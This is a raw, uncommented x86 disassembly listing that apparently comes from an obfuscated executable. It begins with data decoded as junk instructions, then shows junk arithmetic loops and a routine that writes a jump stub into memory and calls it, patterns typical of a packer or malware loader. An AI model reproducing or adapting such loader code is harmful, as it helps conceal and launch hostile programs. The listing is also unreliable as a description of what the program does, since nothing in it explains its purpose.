  416b0f:	mov    eax,ds:0x32a8c7f0
  416b14:	icebp  
  416b15:	pop    ss
  416b16:	xor    eax,0xf2423a99
  416b1b:	xchg   esp,eax
  416b1c:	sahf   
  416b1d:	out    0x99,eax
  416b1f:	mov    eax,ds:0x1b87c513
  416b24:	mov    ah,0x35
  416b26:	jmp    DWORD PTR [edi-0x4fb485aa]
  416b2c:	dec    eax
  416b2d:	jne    0x416ba1
  416b2f:	sbb    DWORD PTR [ecx+0x5f],eax
  416b32:	fucomi st,st(2)
  416b34:	or     ch,dl
  416b36:	lock jmp 0x416b68
  416b39:	fnstenv [eax+0x4]
  416b3c:	dec    edi
  416b3d:	lahf   
  416b3e:	mov    al,ds:0x291c85f3
  416b43:	iret   
  416b44:	jns    0x416b7d
  416b46:	es inc edx
  416b48:	jb     0x416ae5
  416b4a:	pushf  
  416b4b:	fmul   st,st(7)
  416b4d:	daa    
  416b4e:	leave  
  416b4f:	jns    0x416b40
  416b51:	sti    
  416b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b53:	push   edi
  416b54:	neg    DWORD PTR [edi-0x63]
  416b57:	pop    edi
  416b58:	mov    fs,WORD PTR [edi]
  416b5a:	push   cs
  416b5b:	jno    0x416bcc
  416b5d:	push   ebp
  416b5e:	leave  
  416b5f:	add    BYTE PTR [ecx+0x69],bl
  416b62:	cdq    
  416b63:	sub    dl,BYTE PTR [ebx+0x8]
  416b66:	enter  0x3e17,0x14
  416b6a:	ss jl  0x416bac
  416b6d:	jp     0x416ba9
  416b6f:	mov    gs,WORD PTR [edx]
  416b71:	push   es
  416b72:	xchg   esi,esp
  416b74:	push   ds
  416b75:	(bad)  
  416b76:	jns    0x416b17
  416b78:	je     0x416b0a
  416b7a:	push   0x5ff57f3b
  416b7f:	xor    eax,0xc694cd04
  416b84:	test   BYTE PTR [edx],bh
  416b86:	jns    0x416bd6
  416b88:	lds    esp,FWORD PTR [edx-0x57]
  416b8b:	xlat   BYTE PTR ds:[ebx]
  416b8c:	fnstenv [esi]
  416b8e:	xchg   ebx,eax
  416b8f:	mov    esp,0xbf2f2f6a
  416b94:	fwait
  416b95:	xchg   ecx,eax
  416b96:	mov    eax,ds:0xf172f392
  416b9b:	cmp    esp,0x381583da
  416ba1:	adc    eax,esi
  416ba3:	loope  0x416b7d
  416ba5:	test   al,0xb8
  416ba7:	dec    eax
  416ba8:	test   DWORD PTR [ecx-0x5dd2a10],ebp
  416bae:	mov    eax,ds:0x5c526aa4
  416bb3:	sub    DWORD PTR [edx],0x46
  416bb6:	outs   dx,DWORD PTR ds:[esi]
  416bb7:	inc    esi
  416bb8:	rol    BYTE PTR [esi-0x6771f65b],1
  416bbe:	mov    al,0x70
  416bc0:	and    ecx,DWORD PTR [eax-0x37]
  416bc3:	scas   eax,DWORD PTR es:[edi]
  416bc4:	out    dx,eax
  416bc5:	dec    edi
  416bc7:	xchg   esp,eax
  416bc8:	loopne 0x416c48
  416bca:	inc    edx
  416bcb:	fisub  WORD PTR [esi]
  416bcd:	mov    ds,WORD PTR [eax]
  416bcf:	mov    dh,0xc7
  416bd1:	mul    BYTE PTR [eax+0x16eca931]
  416bd7:	sti    
  416bd8:	inc    ebx
  416bd9:	inc    ebx
  416bda:	shr    BYTE PTR [ebx+0x5a9bca22],0x87
  416be1:	sbb    DWORD PTR [ebx+0x54],ebx
  416be4:	arpl   bx,bx
  416be6:	or     esp,DWORD PTR [eax]
  416be8:	add    dh,cl
  416bea:	or     BYTE PTR [ebp+0x52],al
  416bed:	jae    0x416ba4
  416bef:	jecxz  0x416c5a
  416bf1:	and    eax,0xa6acfb2d
  416bf6:	inc    eax
  416bf7:	(bad)  
  416bf9:	inc    esi
  416bfa:	mov    bh,0xee
  416bfc:	inc    esi
  416bfd:	jnp    0x416bfa
  416bff:	push   ecx
  416c00:	mov    ds:0xdc4e6a62,al
  416c05:	pop    ebp
  416c06:	push   es
  416c07:	adc    esi,ebp
  416c09:	test   eax,0xc7454e62
  416c0e:	inc    ecx
  416c0f:	or     cl,0xe6
  416c12:	or     eax,0x44e17f68
  416c17:	jmp    0x72d9:0xaa0ffbf1
  416c1e:	push   esi
  416c1f:	repnz xchg ebx,eax
  416c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c22:	push   esi
  416c23:	sbb    BYTE PTR [ecx-0x63f1dd4a],bh
  416c29:	mov    edi,0x7100fcb
  416c2e:	inc    ebp
  416c2f:	adc    al,0xd1
  416c31:	dec    esp
  416c32:	test   BYTE PTR [edi+0x6b2232fd],0x28
  416c39:	fstp   TBYTE PTR [ebx+edx*4]
  416c3c:	mov    ds:0xba85d4a7,eax
  416c41:	shl    edx,cl
  416c43:	outs   dx,DWORD PTR ds:[esi]
  416c44:	jbe    0x416cac
  416c46:	dec    ebx
  416c47:	inc    ebx
  416c48:	xor    bh,BYTE PTR [edi]
  416c4a:	dec    ebx
  416c4b:	call   0x72734126
  416c50:	test   BYTE PTR [edi],ah
  416c52:	pop    edx
  416c53:	shl    DWORD PTR [edx-0x44],cl
  416c56:	inc    edi
  416c57:	lods   eax,DWORD PTR ds:[esi]
  416c58:	scas   eax,DWORD PTR es:[edi]
  416c59:	mov    al,ds:0xd70c4acc
  416c5e:	push   esp
  416c5f:	test   BYTE PTR [ecx],dl
  416c61:	cmc    
  416c62:	dec    esp
  416c63:	call   0x8130:0x4796788
  416c6a:	ret    0xe525
  416c6d:	mov    ch,0xe1
  416c6f:	iret   
  416c70:	rol    BYTE PTR [eax-0x593a838a],1
  416c76:	xor    DWORD PTR [edx-0x39],esi
  416c79:	dec    esp
  416c7a:	out    dx,al
  416c7b:	dec    ebp
  416c7c:	ret    0x3ff7
  416c7f:	hlt    
  416c80:	cmp    dh,BYTE PTR [edi+eax*2+0x7449ec87]
  416c87:	pop    es
  416c88:	xor    eax,0x8692ba5f
  416c8d:	adc    ch,BYTE PTR [edx+0x781f325a]
  416c93:	push   ss
  416c94:	mov    cl,0x4f
  416c96:	lds    eax,FWORD PTR [ecx]
  416c98:	and    eax,esi
  416c9a:	scas   eax,DWORD PTR es:[edi]
  416c9b:	and    ch,dl
  416c9d:	push   esp
  416c9e:	shl    dl,1
  416ca0:	pusha  
  416ca1:	dec    edx
  416ca2:	ds je  0x416d12
  416ca5:	pop    esi
  416ca6:	stos   BYTE PTR es:[edi],al
  416ca7:	push   edi
  416ca8:	xchg   edx,eax
  416ca9:	cs test al,0xb3
  416cac:	sub    DWORD PTR [edi-0x14],edx
  416caf:	bound  ecx,QWORD PTR [eax+0x325d0333]
  416cb5:	rcr    ebp,1
  416cb7:	mov    eax,0x8c309fac
  416cbc:	inc    eax
  416cbd:	push   eax
  416cbe:	leave  
  416cbf:	daa    
  416cc0:	les    edx,FWORD PTR [esi+esi*1-0x11]
  416cc4:	xchg   ecx,eax
  416cc5:	popa   
  416cc6:	mov    ebx,0xf6ecbdad
  416ccb:	das    
  416ccc:	jbe    0x416c90
  416cce:	ret    0xf2f1
  416cd1:	mov    ebx,DWORD PTR [ebp-0x8]
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428ce1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af45
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428ced
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d41
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d55
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d55
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
